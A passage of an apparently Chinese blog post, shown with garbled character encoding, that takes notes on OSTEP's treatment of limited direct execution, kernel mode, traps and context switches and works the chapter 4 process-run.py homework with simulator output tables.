ç³»ç»Ÿå¼€é”€çš„æƒ…å†µä¸‹å®ç°è™šæ‹ŸåŒ–ï¼Ÿ</li><li>æ§åˆ¶æƒï¼šå¦‚ä½•æœ‰æ•ˆåœ°è¿è¡Œè¿›ç¨‹ï¼ŒåŒæ—¶ä¿ç•™å¯¹ CPU çš„æ§åˆ¶ï¼Ÿ</li></ul><p>è¿è¡Œè¿›ç¨‹çš„ä¸€ä¸ªç®€åŒ–çš„æ–¹å¼ï¼š</p><p>æ“ä½œç³»ç»Ÿï¼š</p><ul><li>åœ¨è¿›ç¨‹åˆ—è¡¨ä¸Šåˆ›å»ºæ¡ç›®</li><li>ä¸ºç¨‹åºåˆ†é…å†…å­˜ï¼Œå¹¶å°†ç¨‹åºåŠ è½½åˆ°å†…å­˜ä¸­</li><li>æ ¹æ® argc/argv è®¾ç½®ç¨‹åºæ ˆ</li><li>æ¸…é™¤å¯„å­˜å™¨</li><li>æ‰§è¡Œ call main() æ–¹æ³•</li></ul><p>è¿›ç¨‹ï¼š</p><ul><li>æ‰§è¡Œmainå¼€å§‹çš„ä»£ç </li><li>return</li></ul><p>æ“ä½œç³»ç»Ÿï¼š</p><ul><li>é‡Šæ”¾è¿›ç¨‹å†…å­˜</li><li>ä»è¿›ç¨‹åˆ—è¡¨ä¸­ç§»é™¤è¿›ç¨‹</li></ul><p>ä½†æ˜¯è¿™ç§æ–¹å¼å­˜åœ¨ä¸€äº›é—®é¢˜ï¼š</p><ul><li>æ“ä½œç³»ç»Ÿæ€ä¹ˆèƒ½ç¡®ä¿ç¨‹åºä¸åšä¸€äº›å—é™æ“ä½œï¼Œå¦‚å‘ç£ç›˜å‘å‡º I/O è¯·æ±‚æˆ–è·å¾—æ›´å¤šç³»ç»Ÿèµ„æºï¼ˆå¦‚ CPU æˆ–å†…å­˜ï¼‰ï¼Ÿ<ul><li>è¿›ç¨‹å¿…é¡»èƒ½å¤Ÿæ‰§è¡Œ I/O å’Œå…¶ä»–ä¸€äº›å—é™åˆ¶çš„æ“ä½œï¼Œä½†åˆä¸èƒ½è®©è¿›ç¨‹å®Œå…¨æ§åˆ¶ç³»ç»Ÿ</li></ul></li><li>å½“æˆ‘ä»¬è¿è¡Œä¸€ä¸ªè¿›ç¨‹æ—¶ï¼Œæ“ä½œç³»ç»Ÿå¦‚ä½•è®©å®ƒåœä¸‹æ¥å¹¶åˆ‡æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹ï¼Œä»è€Œå®ç°è™šæ‹ŸåŒ– CPU æ‰€éœ€çš„æ—¶åˆ†å…±äº«ï¼Ÿ</li></ul><p>é€šè¿‡åŒºåˆ†å†…æ ¸æ¨¡å¼å’Œç”¨æˆ·æ¨¡å¼ï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥æä¾›å—ä¿æŠ¤çš„æ§åˆ¶æƒè½¬ç§»ï¼š</p><blockquote><p>åœ¨ç”¨æˆ·æ¨¡å¼ï¼ˆuser modeï¼‰ä¸‹ï¼Œåº”ç”¨ç¨‹åºä¸èƒ½å®Œå…¨è®¿é—®ç¡¬ä»¶èµ„æºã€‚åœ¨å†…æ ¸æ¨¡å¼ï¼ˆkernel modeï¼‰ä¸‹ï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥è®¿é—®æœºå™¨çš„å…¨éƒ¨èµ„æºã€‚è¿˜æä¾›äº†é™·å…¥ï¼ˆtrapï¼‰å†…æ ¸å’Œä»é™·é˜±è¿”å›ï¼ˆreturn-from-trapï¼‰åˆ°ç”¨æˆ·æ¨¡å¼ç¨‹åºçš„ç‰¹åˆ«è¯´æ˜ï¼Œä»¥åŠä¸€äº›æŒ‡ä»¤ï¼Œè®©æ“ä½œç³»ç»Ÿå‘Šè¯‰ç¡¬ä»¶é™·é˜±è¡¨ï¼ˆtrap tableï¼‰åœ¨å†…å­˜ä¸­çš„ä½ç½® </p></blockquote><p>è¿›ç¨‹ä¸å¯ä»¥ä¸å—çº¦æŸçš„åšæ‰€æœ‰å®ƒæƒ³åšçš„äº‹æƒ…ï¼Œé‚£ä¹ˆå¦‚æœç”¨æˆ·å¸Œæœ›æ‰§è¡ŒæŸç§ç‰¹æƒæ“ä½œæ€ä¹ˆåŠï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯å†…æ ¸å°å¿ƒåœ°å‘ç”¨æˆ·ç¨‹åºæš´éœ²æŸäº›å…³é”®åŠŸèƒ½ï¼ˆé€šè¿‡æä¾›å‡ ç™¾ä¸ªç³»ç»Ÿè°ƒç”¨ï¼‰ï¼Œå¦‚è®¿é—®æ–‡ä»¶ç³»ç»Ÿã€åˆ›å»ºå’Œé”€æ¯è¿›ç¨‹ã€ä¸å…¶ä»–è¿›ç¨‹é€šä¿¡ï¼Œä»¥åŠåˆ†é…æ›´å¤šå†…å­˜</p><p>è¦æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œç¨‹åºå¿…é¡»æ‰§è¡Œç‰¹æ®Šçš„é™·é˜±ï¼ˆtrapï¼‰æŒ‡ä»¤ã€‚è¯¥æŒ‡ä»¤åŒæ—¶è·³å…¥å†…æ ¸å¹¶å°†ç‰¹æƒçº§åˆ«æå‡åˆ°å†…æ ¸æ¨¡å¼ã€‚ä¸€æ—¦è¿›å…¥å†…æ ¸ï¼Œç³»ç»Ÿå°±å¯ä»¥æ‰§è¡Œä»»ä½•éœ€è¦çš„ç‰¹æƒæ“ä½œï¼Œå®Œæˆåï¼Œæ“ä½œç³»ç»Ÿè°ƒç”¨ä¸€ä¸ªç‰¹æ®Šçš„ä»é™·é˜±è¿”å›ï¼ˆreturn-from-trapï¼‰æŒ‡ä»¤ï¼Œè¯¥æŒ‡ä»¤è¿”å›åˆ°å‘èµ·è°ƒç”¨çš„ç”¨æˆ·ç¨‹åºä¸­ï¼ŒåŒæ—¶å°†ç‰¹æƒçº§åˆ«é™ä½ï¼Œå›åˆ°ç”¨æˆ·æ¨¡å¼ã€‚ä¸ºäº†ä¿è¯åœ¨æ“ä½œç³»ç»Ÿå‘å‡ºä»é™·é˜±è¿”å›æŒ‡ä»¤æ—¶èƒ½å¤Ÿæ­£ç¡®è¿”å›ï¼Œå¿…é¡»ç¡®ä¿å­˜å‚¨è¶³å¤Ÿçš„è°ƒç”¨è€…å¯„å­˜å™¨ã€‚ä¾‹å¦‚ï¼Œåœ¨ x86 ä¸Šï¼Œå¤„ç†å™¨ä¼šå°†ç¨‹åºè®¡æ•°å™¨ã€æ ‡å¿—å’Œå…¶ä»–ä¸€äº›å¯„å­˜å™¨æ¨é€åˆ°æ¯ä¸ªè¿›ç¨‹çš„å†…æ ¸æ ˆï¼ˆkernel stackï¼‰ä¸Š</p><p>å› æ­¤ï¼Œåœ¨ä¸Šé¢è¿è¡Œè¿›ç¨‹çš„åŸºç¡€ä¸Šï¼Œéœ€è¦åŠ ä»¥ä¸‹æ“ä½œï¼š</p><ul><li>å†…æ ¸æ ˆç›¸å…³æ“ä½œ</li><li>trapä¸return-from-trap</li><li>ä¸­æ–­å¤„ç†ç¨‹åº</li></ul><h1 id="è¿›ç¨‹çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼ˆcontext-switchï¼‰"><a href="#è¿›ç¨‹çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼ˆcontext-switchï¼‰" class="headerlink" title="è¿›ç¨‹çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼ˆcontext switchï¼‰"></a>è¿›ç¨‹çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼ˆcontext switchï¼‰</h1><ul><li>è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢æ¦‚å¿µï¼šæ“ä½œç³»ç»Ÿè¦ä¸ºå½“å‰æ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹ä¿å­˜ä¸€äº›å¯„å­˜å™¨çš„å€¼ï¼ˆä¾‹å¦‚ï¼Œåˆ°å®ƒçš„å†…æ ¸æ ˆï¼‰ï¼Œå¹¶ä¸ºå³å°†æ‰§è¡Œçš„è¿›ç¨‹æ¢å¤ä¸€äº›å¯„å­˜å™¨çš„å€¼ï¼ˆä»å®ƒçš„å†…æ ¸æ ˆï¼‰</li><li>ä¸ºäº†å®Œæˆè¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œæ“ä½œç³»ç»Ÿä¼šæ‰§è¡Œä¸€äº›åº•å±‚æ±‡ç¼–ä»£ç ï¼Œæ¥ä¿å­˜é€šç”¨å¯„å­˜å™¨ã€ç¨‹åºè®¡æ•°å™¨ï¼Œä»¥åŠå½“å‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„å†…æ ¸æ ˆæŒ‡é’ˆï¼Œç„¶åæ¢å¤å¯„å­˜å™¨ã€ç¨‹åºè®¡æ•°å™¨ï¼Œå¹¶åˆ‡æ¢å†…æ ¸æ ˆï¼Œä¾›å³å°†è¿è¡Œçš„è¿›ç¨‹ä½¿ç”¨</li></ul><p><img src="/image/ostep/Snipaste_2022-09-18_20-01-40.png"></p><h1 id="chapter-4-HW"><a href="#chapter-4-HW" class="headerlink" title="chapter 4 HW"></a>chapter 4 HW</h1><p>1</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs tap">$ ./process-run.py -l 5:100,5:100   <br><br><br><br>Time        PID:<span class="hljs-number"> 0 </span>       PID:<span class="hljs-number"> 1 </span>          CPU           IOs<br> <span class="hljs-number"> 1 </span>       RUN:cpu         READY             1<br> <span class="hljs-number"> 2 </span>       RUN:cpu         READY             1<br> <span class="hljs-number"> 3 </span>       RUN:cpu         READY             1<br> <span class="hljs-number"> 4 </span>       RUN:cpu         READY             1<br> <span class="hljs-number"> 5 </span>       RUN:cpu         READY             1<br> <span class="hljs-number"> 6 </span>          DONE       RUN:cpu             1<br> <span class="hljs-number"> 7 </span>          DONE       RUN:cpu             1<br> <span class="hljs-number"> 8 </span>          DONE       RUN:cpu             1<br> <span class="hljs-number"> 9 </span>          DONE       RUN:cpu             1<br><span class="hljs-number"> 10 </span>          DONE       RUN:cpu             1<br><br>Stats: Total Time 10<br>Stats: CPU Busy<span class="hljs-number"> 10 </span>(100.00%)<br>Stats: IO Busy <span class="hljs-number"> 0 </span>(0.00%)<br><br><br><span class="hljs-comment"># 5:100è¡¨ç¤ºä¸€ä¸ªç¨‹åºç”±5æ¡æŒ‡ä»¤ç»„æˆï¼Œæ¯æ¡æŒ‡ä»¤æ˜¯ CPU æŒ‡ä»¤çš„å‡ ç‡æ˜¯100%</span><br></code></pre></td></tr></table></figure><p>2ã€3</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Time</span>        PID: <span class="hljs-number">0</span>        PID: <span class="hljs-number">1</span>           CPU           IOs<br>  <span class="hljs-attribute">1</span>        RUN:cpu         READY             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">2</span>        RUN:cpu         READY             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">3</span>        RUN:cpu         READY             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">4</span>        RUN:cpu         READY             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">5</span>           DONE        RUN:io             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">6</span>           DONE       WAITING                           <span class="hljs-number">1</span><br>  <span class="hljs-attribute">7</span>           DONE       WAITING                           <span class="hljs-number">1</span><br>  <span class="hljs-attribute">8</span>           DONE       WAITING                           <span class="hljs-number">1</span><br>  <span class="hljs-attribute">9</span>           DONE       WAITING                           <span class="hljs-number">1</span><br> <span class="hljs-attribute">10</span>           DONE       WAITING                           <span class="hljs-number">1</span><br> <span class="hljs-attribute">11</span>*          DONE   RUN:io_done             <span class="hljs-number">1</span><br><br><span class="hljs-attribute">Stats</span>: Total Time <span class="hljs-number">11</span><br><span class="hljs-attribute">Stats</span>: CPU Busy <span class="hljs-number">6</span> (<span class="hljs-number">54</span>.<span class="hljs-number">55</span>%)<br><span class="hljs-attribute">Stats</span>: IO Busy  <span class="hljs-number">5</span> (<span class="hljs-number">45</span>.<span class="hljs-number">45</span>%)<br></code></pre></td></tr></table></figure><p>4</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs tap">Time        PID:<span class="hljs-number"> 0 </span>       PID:<span class="hljs-number"> 1 </span>          CPU           IOs<br> <span class="hljs-number"> 1 </span>        RUN:io         READY             1<br> <span class="hljs-number"> 2 </span>       WAITING       RUN:cpu            <span class="hljs-number"> 1 </span>            1<br> <span class="hljs-number"> 3 </span>       WAITING       RUN:cpu            <span class="hljs-number"> 1 </span>            1<br> <span class="hljs-number"> 4 </span>       WAITING       RUN:cpu            <span class="hljs-number"> 1 </span>            1<br> <span class="hljs-number"> 5 </span>       WAITING       RUN:cpu            <span class="hljs-number"> 1 </span>            1<br> <span class="hljs-number"> 6 </span>       WAITING          DONE                           1<br>  7*   RUN:io_done          DONE             1<br><br>Stats: Total Time 7<br>Stats: CPU Busy<span class="hljs-number"> 6 </span>(85.71%)<br>Stats: IO Busy <span class="hljs-number"> 5 </span>(71.43%)<br><br><br>Time        PID:<span class="hljs-number"> 0 </span>       PID:<span class="hljs-number"> 1 </span>          CPU           IOs<br> <span class="hljs-number"> 1 </span>       RUN:cpu         READY             1<br> <span class="hljs-number"> 2 </span>       RUN:cpu         READY             1<br> <span class="hljs-number"> 3 </span>       RUN:cpu         READY             1<br> <span class="hljs-number"> 4 </span>       RUN:cpu         READY             1<br> <span class="hljs-number"> 5 </span>          DONE        RUN:io             1<br> <span class="hljs-number"> 6 </span>          DONE       WAITING                           1<br> <span class="hljs-number"> 7 </span>          DONE       WAITING                           1<br> <span class="hljs-number"> 8 </span>          DONE       WAITING                           1<br> <span class="hljs-number"> 9 </span>          DONE       WAITING                           1<br><span class="hljs-number"> 10 </span>          DONE       WAITING                           1<br> 11*          DONE   RUN:io_done             1<br><br>Stats: Total Time 11<br>Stats: CPU Busy<span class="hljs-number"> 6 </span>(54.55%)<br>Stats: IO Busy <span class="hljs-number"> 5 </span>(45.45%)<br><br>ä¸€ä¸ªé‡è¦çš„æ ‡å¿—æ˜¯-Sï¼Œå®ƒå†³å®šäº†å½“è¿›ç¨‹å‘å‡º I/O æ—¶ç³»ç»Ÿå¦‚ä½•ååº”ã€‚å°†æ ‡å¿—è®¾ç½®ä¸º SWITCH_ON_ENDï¼Œåœ¨è¿›ç¨‹è¿›è¡Œ I/O æ“ä½œæ—¶ï¼Œç³»ç»Ÿå°†ä¸ä¼šåˆ‡æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹ï¼Œè€Œæ˜¯ç­‰å¾…è¿›ç¨‹å®Œæˆã€‚<br></code></pre></td></tr></table></figure><p>5</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Time</span>        PID: <span class="hljs-number">0</span>        PID: <span class="hljs-number">1</span>           CPU           IOs<br>  <span class="hljs-attribute">1</span>         RUN:io         READY             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">2</span>        WAITING       RUN:cpu             <span class="hljs-number">1</span>             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">3</span>        WAITING       RUN:cpu             <span class="hljs-number">1</span>             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">4</span>        WAITING       RUN:cpu             <span class="hljs-number">1</span>             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">5</span>        WAITING       RUN:cpu             <span class="hljs-number">1</span>             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">6</span>        WAITING          DONE                           <span class="hljs-number">1</span><br>  <span class="hljs-attribute">7</span>*   RUN:io_done          DONE             <span class="hljs-number">1</span><br><br><span class="hljs-attribute">Stats</span>: Total Time <span class="hljs-number">7</span><br><span class="hljs-attribute">Stats</span>: CPU Busy <span class="hljs-number">6</span> (<span class="hljs-number">85</span>.<span class="hljs-number">71</span>%)<br><span class="hljs-attribute">Stats</span>: IO Busy  <span class="hljs-number">5</span> (<span class="hljs-number">71</span>.<span class="hljs-number">43</span>%)<br></code></pre></td></tr></table></figure><p>6</p><figure class="highlight ruleslanguage"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs ruleslanguage">$ ./process-run.py -l <span class="hljs-number">3</span>:<span class="hljs-number">0</span>,<span class="hljs-number">5</span>:<span class="hljs-number">100</span>,<span class="hljs-number">5</span>:<span class="hljs-number">100</span>,<span class="hljs-number">5</span>:<span class="hljs-number">100</span> -S SWITCH_ON_IO -I IO_RUN_LATER -c -p<br><br>Time        PID: <span class="hljs-number">0</span>        PID: <span class="hljs-number">1</span>        PID: <span class="hljs-number">2</span>        PID: <span class="hljs-number">3</span>           CPU           IOs<br>  <span class="hljs-number">1</span>         RUN:io         READY         READY         READY             <span class="hljs-number">1</span><br>  <span class="hljs-number">2</span>        WAITING       RUN:cpu         READY         READY             <span class="hljs-number">1</span>             <span class="hljs-number">1</span><br>  <span class="hljs-number">3</span>        WAITING       RUN:cpu         READY         READY             <span class="hljs-number">1</span>             <span class="hljs-number">1</span><br>  <span class="hljs-number">4</span>        WAITING       RUN:cpu         READY         READY             <span class="hljs-number">1</span>             <span class="hljs-number">1</span><br>  <span class="hljs-number">5</span>        WAITING       RUN:cpu         READY         READY             <span class="hljs-number">1</span>             <span class="hljs-number">1</span><br>  <span class="hljs-number">6</span>        WAITING       RUN:cpu         READY         READY             <span class="hljs-number">1</span>             <span class="hljs-number">1</span><br>  <span class="hljs-number">7</span>*         READY          <span class="hljs-keyword">DONE</span>       RUN:cpu         READY             <span class="hljs-number">1</span><br>  <span class="hljs-number">8</span>          READY          <span class="hljs-keyword">DONE</span>       RUN:cpu         READY             <span class="hljs-number">1</span><br>  <span class="hljs-number">9</span>          READY          <span class="hljs-keyword">DONE</span>       RUN:cpu         READY             <span class="hljs-number">1</span><br> <span class="hljs-number">10</span>          READY          <span class="hljs-keyword">DONE</span>       RUN:cpu         READY             <span class="hljs-number">1</span><br> <span class="hljs-number">11</span>          READY          <span class="hljs-keyword">DONE</span>       RUN:cpu         READY             <span class="hljs-number">1</span><br> <span class="hljs-number">12</span>          READY          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>       RUN:cpu             <span class="hljs-number">1</span><br> <span class="hljs-number">13</span>          READY          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>       RUN:cpu             <span class="hljs-number">1</span><br> <span class="hljs-number">14</span>          READY          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>       RUN:cpu             <span class="hljs-number">1</span><br> <span class="hljs-number">15</span>          READY          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>       RUN:cpu             <span class="hljs-number">1</span><br> <span class="hljs-number">16</span>          READY          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>       RUN:cpu             <span class="hljs-number">1</span><br> <span class="hljs-number">17</span>    RUN:io_done          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>             <span class="hljs-number">1</span><br> <span class="hljs-number">18</span>         RUN:io          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>             <span class="hljs-number">1</span><br> <span class="hljs-number">19</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">20</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">21</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">22</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">23</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">24</span>*   RUN:io_done          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>             <span class="hljs-number">1</span><br> <span class="hljs-number">25</span>         RUN:io          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>             <span class="hljs-number">1</span><br> <span class="hljs-number">26</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">27</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">28</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">29</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">30</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">31</span>*   RUN:io_done          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>             <span class="hljs-number">1</span><br><br>Stats: Total Time <span class="hljs-number">31</span><br>Stats: CPU Busy <span class="hljs-number">21</span> (<span class="hljs-number">67.74</span>%)<br>Stats: IO Busy  <span class="hljs-number">15</span> (<span class="hljs-number">48.39</span>%)<br><br><br>IO_RUN_LATERé€‰é¡¹ä½¿å¾—å½“ I/O å®Œæˆæ—¶ï¼Œå‘å‡ºå®ƒçš„è¿›ç¨‹ä¸ä¸€å®šé©¬ä¸Šè¿è¡Œï¼Œå½“æ—¶æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ä¸€ç›´è¿è¡Œï¼›<br><br>ä½¿ç”¨-I IO_RUN_IMMEDIATE è®¾ç½®ï¼Œè¯¥è®¾ç½®ç«‹å³è¿è¡Œå‘å‡ºI/Oçš„è¿›ç¨‹<br><br>è¿™ç§æ–¹å¼ä¼šè®©IOç¨‹åºç­‰å¾…ï¼ŒIOç¨‹åºå¦‚æœä¼˜å…ˆä½¿ç”¨CPUï¼Œå½“IOç¨‹åºè¢«é˜»å¡çš„æ—¶å€™ï¼Œå…¶ä»–è¿›ç¨‹è¢«CPUè°ƒåº¦ï¼Œè¿™ç§æƒ…å†µä¸‹çš„CPUåˆ©ç”¨ç‡æ›´é«˜ã€‚<br></code></pre></td></tr></table></figure><p>7</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs tap">./process-run.py -l 3:0,5:100,5:100,5:100 -S SWITCH_ON_IO -I IO_RUN_IMMEDIATE -c -p<br>Time        PID:<span class="hljs-number"> 0 </span>       PID:<span class="hljs-number"> 1 </span>       PID:<span class="hljs-number"> 2 </span>       PID:<span class="hljs-number"> 3 </span>          CPU           IOs<br> <span class="hljs-number"> 1 </span>        RUN:io         READY         READY         READY             1<br> <span class="hljs-number"> 2 </span>       WAITING       RUN:cpu         READY         READY            <span class="hljs-number"> 1 </span>            1<br> <span class="hljs-number"> 3 </span>       WAITING       RUN:cpu         READY         READY            <span class="hljs-number"> 1 </span>            1<br> <span class="hljs-number"> 4 </span>       WAITING       RUN:cpu         READY         READY            <span class="hljs-number"> 1 </span>            1<br> <span class="hljs-number"> 5 </span>       WAITING       RUN:cpu         READY         READY            <span class="hljs-number"> 1 </span>            1<br> <span class="hljs-number"> 6 </span>       WAITING       RUN:cpu         READY         READY            <span class="hljs-number"> 1 </span>            1<br>  7*   RUN:io_done          DONE         READY         READY             1<br> <span class="hljs-number"> 8 </span>        RUN:io          DONE         READY         READY             1<br> <span class="hljs-number"> 9 </span>       WAITING          DONE       RUN:cpu         READY            <span class="hljs-number"> 1 </span>            1<br><span class="hljs-number"> 10 </span>       WAITING          DONE       RUN:cpu         READY            <span class="hljs-number"> 1 </span>            1<br><span class="hljs-number"> 11 </span>       WAITING          DONE       RUN:cpu         READY            <span class="hljs-number"> 1 </span>            1<br><span class="hljs-number"> 12 </span>       WAITING          DONE       RUN:cpu         READY            <span class="hljs-number"> 1 </span>            1<br><span class="hljs-number"> 13 </span>       WAITING          DONE       RUN:cpu         READY            <span class="hljs-number"> 1 </span>            1<br> 14*   RUN:io_done          DONE          DONE         READY             1<br><span class="hljs-number"> 15 </span>        RUN:io          DONE          DONE         READY             1<br><span class="hljs-number"> 16 </span>       WAITING          DONE          DONE       RUN:cpu            <span class="hljs-number"> 1 </span>            1<br><span class="hljs-number"> 17 </span>       WAITING          DONE          DONE       RUN:cpu            <span class="hljs-number"> 1 </span>            1<br><span class="hljs-number"> 18 </span>       WAITING          DONE          DONE       RUN:cpu            <span class="hljs-number"> 1 </span>            1<br><span class="hljs-number"> 19 </span>       WAITING          DONE          DONE       RUN:cpu            <span class="hljs-number"> 1 </span>            1<br><span class="hljs-number"> 20 </span>       WAITING          DONE          DONE       RUN:cpu            <span class="hljs-number"> 1 </span>            1<br> 21*   RUN:io_done          DONE          DONE          DONE             1<br><br>Stats: Total Time 21<br>Stats: CPU Busy<span class="hljs-number"> 21 </span>(100.00%)<br>Stats: IO Busy <span class="hljs-number"> 15 </span>(71.43%)<br><br><br></code></pre></td></tr></table></figure><h1 id="chapter-5-HW"><a href="#chapter-5-HW" class="headerlink" title="chapter 5 HW"></a>chapter 5 HW</h1><h2 id="1"><a href="#1" class="headerlink" 